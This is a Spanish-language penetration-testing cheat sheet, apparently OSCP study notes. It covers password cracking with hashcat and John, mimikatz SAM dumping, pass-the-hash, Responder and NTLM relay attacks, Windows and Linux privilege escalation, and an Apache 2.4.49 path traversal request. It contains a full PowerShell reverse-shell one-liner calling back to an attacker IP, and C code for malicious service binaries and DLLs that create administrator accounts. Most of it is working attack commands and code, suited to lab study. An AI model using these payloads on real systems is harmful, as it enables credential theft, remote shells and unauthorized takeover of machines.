
## Password attacks

  Crear una regla para hashcat que añada '1@3$5' al final de cada contraseña:

    └─# cat demo.rule
    $1 $@ $3 $$ $5

  Utilizamos la regla para crackear el hash MD5:

    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r demo.rule

  Crear una regla para convertir todo a mayúsculas con 'u' y duplicar cada palabara 'd':

    └─# cat demo2.rules 
    u d

  Ejecutamos el ataque:

    └─# hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt -r demo2.rules

  Conseguimos la contraseña:

    19adc0e8921336d08502c039dc297ff8:<REDACTED>

  Reglas de contraseñas:

    https://hashcat.net/wiki/doku.php?id=rule_based_attack

### Keepass

  Buscamos por archivos de Keepass:

    Get-ChildItem -Path C: -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

  Nos transferimos el archivo a nuestro local y sacamos el hash con keepass2john:

    └─# keepass2john Database.kdbx > keepass.hash

  Lanzamos hashcat con la regla /rockyou-30000.rule para crackear la contraseña:

    └─# hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

### id_rsa

  Para sacar el hash de una clave privada id_rsa:

    ssh2john id_rsa > ssh.hash

  Para pasar las reglas a JTR, tenemos que modificar el archivo custom.rule:

    └─# cat custom.rule 
    [List.Rules:sshRules]
    c $1 $3 $7 $@
    c $1 $3 $7 $$
    c $1 $3 $7 $#

    sh -c 'cat custom.rule >> /etc/john/john.conf'

  Y corremos JTR:

    └─# john --wordlist=ssh.passwords --rules=sshRules ssh_hash

### NTLM

  Si tenemos privilegios de Administador en una máquina Windows, ejecutamos el comando para ver otros usuarios en el sistema a través de PowerShell:

    Get-LocalUser

  Una vez localicemos los nuevos usuarios, corremos mimikatz y ejecutamos:

    privilege::debug

  Con este comando activamos el permiso 'SeDebugPrivilege' que es necesario para este ataque. Después, lanzamos:

    token::elevate

  Para elevar privilegios a SISTEMA.

  Finalmente, para obtener los hashes:

    lsadump::sam

Una vez tenemos el hash, buscamos en hashcat el modo de crackeo:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/f9b028e5-0d0e-4e5a-a8f0-1156c3ac3d84)

En este caso, el modo es 1000, por lo tanto:

    └─# hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt

Y obtenemos la contraseña en texto plano.

### PassTheHash

Conectar a compartido por smbclient con PtH:

    smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

Obtener shell con psexec a través de PtH:

    impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

Obtener hash NTLM desde un formulario de carga de archivos:

  Tenemos el formulario de carga:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/0e8305d9-b2f8-40d4-a58f-333a4e4df9fa)

  Subimos un fichero cualquiera y capturamos la petición con BurpSuite:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/162f3a70-59bb-42ff-8ec3-e12e82d2307a)

  Nos ponemos en escucha con responder por la interfaz correspondiente:

    └─# responder -I tun0

  Enviamos la siguiente petición:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/0a6aea7c-89ef-4cb9-a936-f6ae8fff365f)

  Y recibimos el hash:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/05039fb0-22bc-42d3-83a7-a30f7bd9111e)

  ### NTLM-relay attack

  Tenemos acceso con el usuario 'files02admin' a la máquina 'files01':

  ![image](https://github.com/loqasto/OSCP/assets/111526713/6e4955e6-8773-4b18-a063-20b102efc4cb)

  Codificamos en base64 una cadena de powershell reverse-shell de una sola línea, que apunte a nuestra máquina de ataque:

    $TEXTO = '$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.212'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    $ENCODED1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXTO))
    Write-Output $ENCODED1

  Con ntlmrelay de Impacket, nos ponemos en escucha para recibir una conexión por smb que ejecute la rev shell:

    └─# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.245.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...."

  Nos ponemos en escucha por el puerto indicado en la one liner de PS:

    nc -lnvp 443

  Y desde la máquina files01 intentamos conectarnos por SMB a nuestra máquina con ntlmrelay corriendo, los que hará que se ejecuta la rev shell de powershell y nos llegue la shell al puerto en escucha:

    dir \\192.168.45.212\test

  ![image](https://github.com/loqasto/OSCP/assets/111526713/473ec30f-1b0c-4063-8ffd-d3a27518903c)

## Windows Privilege Escalation

  ### Service Hijacking

  Encontramos servicios corriendo:

    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

  Enumeramos permisos a partir de esta tabla:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/9124d7af-b927-4674-9ee7-a1bc3e0eb0f1)

  Comprobamos los permisos de un binario utilizando el comamndo icacls:

    PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
    C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)
  
  Y vemos que todos los usuarios tienen permisos Full (F) sobre este binario.

  Creamos un binario en nuestro Kali para sustituir el binario vulnerable:

    #include <stdlib.h>

    int main ()
    {
      int i;
      
      i = system ("net user dave2 password123! /add");
      i = system ("net localgroup administrators dave2 /add");
      
      return 0;
    }

  Lo compilamos:

    x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

  Subimos el nuevo binario a la máquina víctima y lo sustituimos por el original aprovechando los permisos full.

  Utilizando el comando 'net stop' y 'net start' podemos parar y arrancar el servicio, y una vez arrancado, tendremos permisos de Administrador en la máquina.

  Si no nos deja parar y arrancar, comprobamos si el servicio se puede modificar manualmente:

    PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
  
    Name  StartMode
    ----  ---------
    mysql Auto  

  En este caso, podemos ver si entre nuestros privilegios se encuentra el 'SeShutdownPrivilege' con whoami /priv. 

  Si es así, podemos reiniciar la máquina y el comando se ejecutará en el reinicio gracias al path hijacking que hemos realizado.

    shutdown /r /t 0 

  Podemos utilizar también la herramienta PowerUp.ps1. Para ello la subimos a la máquina víctima y ejecutamos:

    powershell -ep bypass

    Import-Module .\PowerUp.ps1

    Get-ModifiableServiceFile

### DLL Hijacking

  Buscamos servicios en estado 'Running':

    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

  Encontramos uno y comprobamos con icacls si tenemos permisos de escritura sobre ese binario, pero no es el caso.

  Abirmos 'ProcMon' y buscamos por el proceso vulnerable, en este caso BetaServ.exe:

   ![image](https://github.com/loqasto/OSCP/assets/111526713/2cd34421-eb13-4d81-a01d-506cba898138)

  Como vemos en la imagen, el binario busca sus propios .dll para ejecutarse. En este caso, bemos que busca myDLL.dll en la carpeta 'Documents' del usuario 'steve'.

  Como estamos logeados con ese usuario, tenemos permisos de escritura ahí. Creamos nuestro .dll malicioso:

      #include <stdlib.h>
    #include <windows.h>
    
    BOOL APIENTRY DllMain(
    HANDLE hModule,// Handle to DLL module
    DWORD ul_reason_for_call,// Reason for calling function
    LPVOID lpReserved ) // Reserved
    {
        switch ( ul_reason_for_call )
        {
            case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
      	    i = system ("net user dave2 password123! /add");
      	    i = system ("net localgroup administrators dave2 /add");
            break;
            case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
            case DLL_THREAD_DETACH: // A thread exits normally.
            break;
            case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
        }
        return TRUE;
    }

  Lo compilamos:

    x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

  Lo subimos a través de 'iwr' y Powershell y lo dejamos en C:\Users\steve\Documents. Reiniciamos el servicio BetaServ:

    Restart-Service BetaService

  Y comprobamos que se han ejecutado nuestros comandos, habiendo creado un usuario dave2 y añadiendóle al grupo Administrators.

## Path hijacking

  Encontramos algún path de un binario sin comillas:

    wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

  Con icals, comprobamos si en alguna de las carpetas del path podemos escribir con nuestro usuario actual. Por ejemplo, en el siguiente path:

    C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

  Si tenemos permiso de escritura en 'Current Version', tenemos que crear un binario llamado 'Current.exe', ya que Windows intentará ejecutar ese binario. Si fuese en 'Enterprise Apps', sería 'Enterprise.exe'.

  Creamos el binario:

    #include <stdlib.h>
    
    int main ()
    {
      int i;
      
      i = system ("net user loqax loqax1234! /add");
      i = system ("net localgroup administrators loqax /add");
      
      return 0;
    }

  Compilamos:

    x86_64-w64-mingw32-gcc mysql.c -o Current.exe

  Y lo subimos al path vulnerable. Ejecutamos 'Restar-Service service_name' y el comando dentro de nuestro binario malicioso se habrá ejecutado.

## Linux Privilege Escalation

  Encontrar jobs que se ejecutan en crontab:

    grep "CRON" /var/log/syslog

  Buscar por procesos que se ejecutan en el sistema:

    watch -n 1 "ps -aux | grep pass"

  Reglas de iptable:

    cat /etc/iptables/rules.v4

  Ficheros con permisos de escritura con el usuario actual:

    find / -writable -type d 2>/dev/null

  Paquetes instalados en el sistema:

    dpkg -l

  Comprobar montajes:

    cat /etc/fstab 

  Capturar tráfico dentro de la red:

    sudo tcpdump -i lo -A | grep "pass"

## Vulnerabilidades conocidas

Apache HTTP Server 2.4.49 - Path traversal

    GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
    Host: https://www.twitter.com/vulnmachines
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Pragma: no-cache
    Cache-Control: no-cache

    
